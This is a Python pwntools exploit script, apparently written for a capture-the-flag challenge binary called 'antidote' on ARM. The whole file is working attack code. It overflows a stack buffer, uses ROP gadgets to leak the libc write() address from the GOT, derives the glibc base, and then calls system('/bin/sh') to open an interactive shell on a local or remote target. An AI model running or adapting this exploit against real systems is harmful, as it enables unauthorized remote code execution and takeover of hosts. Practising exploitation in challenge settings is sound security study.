#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('antidote')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    global glibc

    if len(sys.argv) == 1:
        glibc = ELF('/usr/arm-linux-gnueabi/lib/libc.so.6', checksec=False)
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    pop_r3_pc = 0x83cc
    pop_r4_r5_r6_r7_r8_sb_sl_pc = 0x8628
    mov_r0_sl_mov_r1_r2_mov_r2_r7_blx_r3 = 0x85f4

    offset = 216
    junk = b'A' * offset

    payload  = junk
    payload += p32(0xfffef85c)
    payload += p32(pop_r3_pc)
    payload += p32(elf.got.write)
    payload += p32(elf.sym.main + 76)

    p.recv()
    p.send(payload)

    write_addr = u32(p.recv(4))
    log.info(f'Leaked write() address: {hex(write_addr)}')

    glibc.address = write_addr - glibc.sym.write
    log.success(f'Glibc base address: {hex(glibc.address)}')

    payload  = junk
    payload += p32(0xfffef85c)
    payload += p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)
    payload += p32(0) * 6
    payload += p32(next(glibc.search(b'/bin/sh')))
    payload += p32(pop_r3_pc)
    payload += p32(glibc.sym.system)
    payload += p32(mov_r0_sl_mov_r1_r2_mov_r2_r7_blx_r3)

    p.recv()
    p.send(payload)

    p.interactive()


if __name__ == '__main__':
    main()
